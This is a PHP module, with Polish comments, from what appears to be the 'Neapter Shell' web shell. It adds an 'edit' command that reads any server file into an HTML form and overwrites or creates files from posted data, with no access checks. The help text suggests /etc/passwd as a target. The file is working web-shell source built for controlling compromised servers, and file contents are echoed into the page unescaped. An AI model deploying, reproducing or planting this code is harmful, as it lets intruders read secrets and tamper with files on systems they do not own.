<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * Zmienianie uprawnien dla pliku
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2012-2016, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModuleEdit extends ModuleAbstract
{
    /**
     * Dostepna lista komend
     *
     * @access public
     * @return array
     */
    public static function getCommands()
    {
        return array('edit');
    }

    /**
     * Zwracanie wersji modulu
     *
     * @access public
     * @return string
     */
    public static function getVersion()
    {
        return '1.0.0 2016-02-26 - <krzotr@gmail.com>';
    }

    /**
     * Zwracanie pomocy modulu
     *
     * @access public
     * @return string
     */
    public static function getHelp()
    {
        return <<<DATA
edit - Edycja oraz tworzenie nowego pliku

    Użycie:
        edit /etc/passwd
        edit /sciezka/do/nowego/pliku
DATA;
    }

    /**
     * Wywolanie modulu
     *
     * @access public
     * @return string
     */
    public function get()
    {
        $sFile = $this->oArgs->getRawData();

        /**
         * Zapis do pliku
         */
        if (($sFiledata = Request::getPost('filedata')) !== FALSE) {
            $bSuccess = (bool) file_put_contents($sFile, $sFiledata);

            return sprintf('Plik %szostał zapisany', (!$bSuccess ? 'nie ' : NULL));
        }

        /**
         * Formularz
         */
        return sprintf('<form action="%s" method="post">' .
            '<textarea id="edit" name="filedata">%s</textarea><br/>' .
            '<input type="text" name="cmd" readonly="readonly" value=":edit %s" size="110" id="cmd" autocomplete="on"/>' .
            '<input type="submit" name="submit" value="Zapisz" /></form>',
            Request::getCurrentUrl(),
            ((is_file($sFile) && is_readable($sFile)) ? file_get_contents($sFile) : NULL),
            $sFile,
            htmlspecialchars(Request::getPost('cmd'))
        );
    }

}
